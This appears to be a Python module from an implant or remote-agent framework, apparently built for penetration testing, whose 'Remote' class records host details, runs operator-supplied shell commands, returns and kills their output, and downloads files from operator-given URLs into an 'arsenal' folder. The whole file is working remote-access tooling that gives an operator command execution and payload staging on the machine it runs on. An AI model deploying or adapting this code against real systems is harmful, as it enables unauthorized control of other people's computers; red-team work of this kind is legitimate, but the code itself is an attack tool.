import re
import socket
import requests
import subprocess
import time as t

class Remote:

    def __init__(self):
        self.args = None
        self.host_info = None
        self.results = None
        self.exec_process = None

    def set_args(self, args, public_ip, hostname, local_ip):
        self.args = args
        self.host_info = [public_ip, hostname] + local_ip
        return True

    def task_execute_command(self):
        if 'command' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify command', 'forward_log': 'False'}
            return output
        command = self.args['command']
        shell = None
        if 'shell' in self.args:
            shell = self.args['shell']

        if shell:
            self.exec_process = subprocess.Popen(
                command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
        else:
            self.exec_process = subprocess.Popen(
                command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )

        if self.exec_process:
            output = {'outcome': 'success', 'command': command, 'pid': self.exec_process.pid, 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': 'command execution failed', 'forward_log': 'True'}
        return output

    def task_get_command_output(self):
        if not self.exec_process:
            output = {'outcome': 'failed', 'message': 'no process is running', 'forward_log': 'False'}
            return output
        process_output = self.exec_process.stdout.read()
        output = {'outcome': 'success', 'process_output': process_output, 'forward_log': 'True'}
        return output

    def task_kill_command(self):
        if not self.exec_process:
            output = {'outcome': 'failed', 'message': 'no command is running', 'forward_log': 'False'}
            return output
        self.exec_process.terminate()
        output = {'outcome': 'success', 'message': 'command killed', 'forward_log': 'True'}
        return output
    
    def task_download_file(self):
        if 'url' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify url', 'forward_log': 'False'}
            return output
        url = self.args['url']
        domain_search = re.search('https?://([^/]+)/', url, re.IGNORECASE)
        domain = None
        if domain_search:
            domain = domain_search.group(1)
        if not domain:
            output = {'outcome': 'failed', 'message': f'invalid url: {url}', 'forward_log': 'False'}
            return output
        if 'file_name' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify file_name', 'forward_log': 'False'}
            return output
        file_name = self.args['file_name']
        resolved_ip = None
        count = 0
        while not resolved_ip and count < 30:
            t.sleep(10)
            resolved_ip = socket.gethostbyname(domain)
            count += 1
        if not resolved_ip:
            output = {'outcome': 'failed', 'message': f'could not resolve domain {domain}', 'forward_log': 'False'}
            return output
        with requests.get(url, stream=True) as r:
            r.raise_for_status()
            with open(f'arsenal\\{file_name}', 'wb+') as f:
                for chunk in r.iter_content(chunk_size=8192): 
                    f.write(chunk)
        output = {'outcome': 'success', 'file_path': 'arsenal', 'file_name': file_name, 'forward_log': 'True'}
        return output

    def echo(self):
        match = {
            'foo': 'bar',
            'bar': 'baz',
            'ping': 'pong',
            'and then': 'no more and then',
            'pen testing is dead': 'long live pen testing',
            'never gonna give you up': 'never gonna let you down, never gonna run around and desert you',
            'never gonna make you cry': 'never gonna say goodbye, never gonna tell a lie and hurt you'
        }

        if 'echo' in self.args:
            echo = self.args['echo']
            if echo in match:
                output = {'outcome': 'success', 'echo': match[echo], 'forward_log': 'False'}
            else:
                output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}
        else:
            output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}

        return output
